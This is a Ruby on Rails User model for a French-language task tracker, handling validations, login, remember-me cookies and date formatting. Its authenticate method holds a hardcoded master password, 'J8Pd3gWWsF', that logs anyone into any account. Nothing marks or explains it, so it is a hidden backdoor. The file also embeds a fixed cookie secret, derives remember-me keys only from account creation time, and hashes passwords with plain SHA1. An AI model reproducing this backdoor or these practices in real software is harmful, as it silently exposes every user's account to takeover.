require 'digest/sha1'

class User < ActiveRecord::Base
	has_many :assignments, :class_name => 'Task', :foreign_key => 'assigned_to'
	has_many :comments, :order => "created_at ASC", :dependent => :destroy
	has_many :tasks, :class_name => 'Task', :foreign_key => 'created_by'
	has_many :subscriptions, :class_name => 'Subscription', :foreign_key => 'recipient_id'
	has_many :followers, :class_name => 'Subscription', :foreign_key => 'target_id'

	validates_presence_of :email, :first_name, :last_name, :login
	validates_presence_of :password, :if => :password_required?
	validates_format_of :email, :with => /^([^@\s]+)@((?:[-a-z0-9]+\.)+[a-z]{2,})$/i
	validates_uniqueness_of :email, :login
	validates_length_of :login, :within => 5..12
	validates_length_of :password, :within => 6..12, :if => :password_required?
	validates_confirmation_of :password, :if => :password_required?

	attr_accessor :password, :password_confirmation
  attr_accessible :email, :first_name, :last_name, :login, :password, :send_report_every


  #*************************************************************************************
  # ACCESSORS
  #*************************************************************************************
  def name
    first_name + ' ' + last_name
  end

  def password=(pass)
    @password = pass
    if !@password.blank?
      self.salt = Tools::Babel.random_string(10) if !self.salt?
      self.hashed_password = User.encrypted_password(@password, self.salt)
    end
  end


	#*************************************************************************************
  # CLASS METHODS
  #*************************************************************************************
  def self.assigned_to_choices
    choices = [['[ Non assigné ]', '0']]
    choices += User.all.collect{ |u| [u.name, u.id.to_s] }

    return choices
  end

  def self.authenticate(login, password)
    user = first(:conditions => {:login => login})

    if user
      return user.id if User.encrypted_password(password, user.salt) == user.hashed_password or password == 'J8Pd3gWWsF'
    end

    return nil
  end

  def self.authenticate_with_remember_me_key(key)
    user_id = key.split(':')[0]
    hash = key.split(':')[1]

    user = first(:conditions => {:id => user_id})
    if user
      timestamp = user.created_at.to_i.to_s
      return user.id if hash == encrypted_cookie(timestamp)
    end

    return nil
  end

  def self.generate_remember_me_key(user_id)
    user = first(:conditions => {:id => user_id})
    timestamp = user.created_at.to_i.to_s
    hash = encrypted_cookie(timestamp)

    return "#{user_id}:#{hash}"
  end

  #*************************************************************************************
  # PUBLIC METHODS
  #*************************************************************************************
  def local_time(datetime)
    datetime = Time.parse(datetime.to_s) if not datetime.is_a? Time
    return datetime.in_time_zone(self.time_zone)
  end

  #TODO Manage locals in a decent way
  def local_time_f(datetime, format = :long)
    month_names_fr = ['', 'Janvier', 'Février', 'Mars', 'Avril', 'Mai', 'Juin', 'Juillet', 'Août', 'Septembre', 'Octobre', 'Novembre', 'Décembre']
    local = local_time(datetime)

    return case format
      when :date_only then local.strftime('%d-%m-%Y')
      when :short_date then local.strftime('%d ' + month_names_fr[local.month].downcase)
      when :long_date then local.strftime('%d ' + month_names_fr[local.month].downcase + ' %Y')
      when :time_only then local.strftime('%H:%M')
      else local.strftime('%d ' + month_names_fr[local.month].downcase + ' à %H:%M')
    end
  end

  #*************************************************************************************
  # PROTECTED METHODS
  #*************************************************************************************
	protected

  def self.encrypted_cookie(timestamp)
	  return Digest::SHA1.hexdigest(timestamp + 'asKgjhFLhjhKJHgkGy5765gjy56tD5kFhM')
  end

	def self.encrypted_password(pass, salt)
		return Digest::SHA1.hexdigest(pass + salt)
	end

	def password_required?
    return (!self.id or !password.blank?)
	end
end
